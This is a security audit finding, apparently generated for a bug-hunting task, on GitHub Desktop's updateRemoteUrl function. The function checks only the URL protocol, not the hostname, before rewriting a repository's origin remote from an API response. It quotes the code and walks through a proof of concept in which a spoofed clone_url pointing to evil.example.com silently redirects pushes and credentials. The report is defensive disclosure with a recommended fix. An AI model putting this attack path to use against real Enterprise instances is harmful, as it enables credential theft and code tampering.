## Title
`updateRemoteUrl` silently rewrites the local git remote's hostname to an attacker-supplied value from a GitHub API response - (File: `app/src/lib/stores/updates/update-remote-url.ts`)

### Summary
The Miniwasm report shows a broken validation gate: a guard function was supposed to enforce a safety invariant but instead let (or blocked) an unintended state transition. The GitHub Desktop analog is `updateRemoteUrl`, a function that automatically rewrites a repository's git `origin` remote URL whenever GitHub Desktop refreshes repository metadata from the GitHub API. Its guard only checks that the *protocol* (`https:`/`ssh:`) of the old and new URL match — it never verifies that the *hostname* is unchanged. As a result, a value taken directly from a GitHub API response (`apiRepo.clone_url`) can silently redirect the user's local git remote to an entirely different host, with no user confirmation.

### Finding Description
`updateRemoteUrl` is invoked from `repositoryWithRefreshedGitHubRepository` in `app-store.ts` every time Desktop refreshes GitHub metadata for a repository (e.g. periodic repository indicator refresh, or when reopening a repo): [1](#0-0) 

The function decides whether to overwrite the local remote with the API-provided clone URL: [2](#0-1) 

The only checks performed before calling `gitStore.setRemoteURL(...)` are:
1. `remoteUrlUnchanged` — the *previously cached* `gitHubRepository.cloneURL` still matches the current local remote (via `urlMatchesRemote`, which does compare hostname/owner/name).
2. `protocolsMatch` — old and new URL protocol strings are identical (e.g., both `https:`).
3. `!urlsMatch` — the new URL differs from the current remote.

Critically, there is **no check that the new URL's hostname matches the old one**. `protocolsMatch` only compares the scheme, not the host: [3](#0-2) 

If condition (1) holds — which is the normal state for the vast majority of GitHub Desktop users who never manually edit their remote — and the protocol of the malicious URL matches (trivial: just use `https://`), the app will call `gitStore.setRemoteURL` unconditionally, silently rewriting the origin remote to point anywhere: [4](#0-3)  which shells out to `git remote set-url`: [5](#0-4) 

The `apiRepo.clone_url` value originates from a plain GitHub REST API JSON response (`fetchRepository`), which is attacker-influenceable in scenarios such as: a compromised/malicious GitHub Enterprise Server instance, a MITM'd/spoofed enterprise API endpoint, or (for github.com) any situation where the attacker can influence the metadata of a repository the user has already cloned (e.g. via repo transfer/rename combined with a race, or a compromised org/repo).

### Impact Explanation
This meets the "silent corruption of what the user commits or pushes" criterion: subsequent `git fetch`/`git pull`/`git push` operations performed by Desktop or the user (unaware the remote changed) will interact with whatever host the attacker specified, potentially:
- Leaking git credentials/tokens used for HTTPS authentication to the attacker's server (the trampoline credential helper will present credentials for whatever remote URL is configured).
- Causing the user to unknowingly push commits to, or fetch/merge code from, an attacker-controlled remote.

There is no dialog, confirmation, or hostname pinning shown to the user before the remote is changed — it happens as a background side effect of a routine metadata refresh.

### Likelihood Explanation
The `remoteUrlUnchanged` precondition holds for the overwhelming majority of GitHub Desktop users (those who never manually edited the remote), so the guard that is supposed to prevent unexpected changes is trivially satisfiable. The only real obstacle for an attacker is influencing the `clone_url` field of an `IAPIRepository` response for a repo the victim already has cloned locally, which is a realistic threat model on GitHub Enterprise Server (network-adjacent/compromised or MITM'd instance) as noted in the task's scope ("a GitHub API object ... or a git remote/proxy response").

### Recommendation
In `updateRemoteUrl` (`app/src/lib/stores/updates/update-remote-url.ts`), additionally verify that the hostname of the new URL matches the hostname of the existing remote/endpoint (not just the protocol) before calling `setRemoteURL`, e.g. by comparing `parsedRemoteUrl.hostname === parsedUpdatedRemoteUrl.hostname`, and/or require the new URL's hostname to match `gitHubRepository.endpoint`'s host. Consider surfacing a confirmation to the user when the remote host itself changes rather than silently applying it.

### Proof of Concept
1. User has a repository cloned from `https://github.example.com/acme/widgets` (origin remote URL unmodified from the cached `gitHubRepository.cloneURL`).
2. Attacker compromises/MITMs the GHES instance's `repos/{owner}/{name}` API response (or otherwise controls the `clone_url` field returned to `fetchRepository`) and sets `clone_url` to `https://evil.example.com/acme/widgets`.
3. Desktop performs a routine refresh (`repositoryWithRefreshedGitHubRepository`), calling `updateRemoteUrl(gitStore, repository.gitHubRepository, apiRepo)`.
4. `remoteUrlUnchanged` is `true` (user never touched the remote), `protocolsMatch` is `true` (both `https:`), `urlsMatch` is `false` (hostnames differ) → guard passes.
5. `gitStore.setRemoteURL('origin', 'https://evil.example.com/acme/widgets')` runs `git remote set-url origin ...`, silently repointing origin.
6. Next fetch/push by the user (or Desktop's background fetch) sends git protocol traffic and credentials to `evil.example.com`.

```typescript
export async function updateRemoteUrl(
  gitStore: GitStore,
  gitHubRepository: GitHubRepository,
  apiRepo: IAPIRepository
): Promise<void> {
  // I'm not sure when these early exit conditions would be met. But when they are
  // we don't have enough information to continue so exit early!
  if (gitStore.defaultRemote === null) {
    return
  }

  const remoteUrl = gitStore.defaultRemote.url
  const updatedRemoteUrl = apiRepo.clone_url
  const urlsMatch = urlMatchesRemote(updatedRemoteUrl, gitStore.defaultRemote)

  // Verify that protocol hasn't changed. If it has we don't want
  // to alter the protocol in case they are relying on a specific one.
  // If protocol is null that implies the url is a ssh url
  // of the format git@github.com:octocat/Hello-World.git, which
  // can't be parsed by URL.parse. In this case we assume the user
  // manually configured their remote to use this format and we don't
  // want to change what they've done just to be safe
  const parsedRemoteUrl = URL.parse(remoteUrl)
  const parsedUpdatedRemoteUrl = URL.parse(updatedRemoteUrl)
  const protocolsMatch =
    parsedRemoteUrl.protocol !== null &&
    parsedUpdatedRemoteUrl.protocol !== null &&
    parsedRemoteUrl.protocol === parsedUpdatedRemoteUrl.protocol

  // Check if the default remote url has been manually changed from the
  // clone url retrieved from the GitHub API previously
  const remoteUrlUnchanged =
    gitStore.defaultRemote &&
    urlMatchesRemote(gitHubRepository.cloneURL, gitStore.defaultRemote)

  if (protocolsMatch && remoteUrlUnchanged && !urlsMatch) {
    await gitStore.setRemoteURL(gitStore.defaultRemote.name, updatedRemoteUrl)
  }
}
```

```typescript
  public async setRemoteURL(name: string, url: string): Promise<boolean> {
    const wasSuccessful =
      (await this.performFailableOperation(() =>
        setRemoteURL(this.repository, name, url)
      )) === true
    await this.loadRemotes()

    this.emitUpdate()
    return wasSuccessful
```

```typescript
/** Changes the URL for the remote that matches the given name  */
export async function setRemoteURL(
  repository: Repository,
  name: string,
  url: string
): Promise<true> {
  await git(['remote', 'set-url', name, url], repository.path, 'setRemoteURL')
  return true
}
```
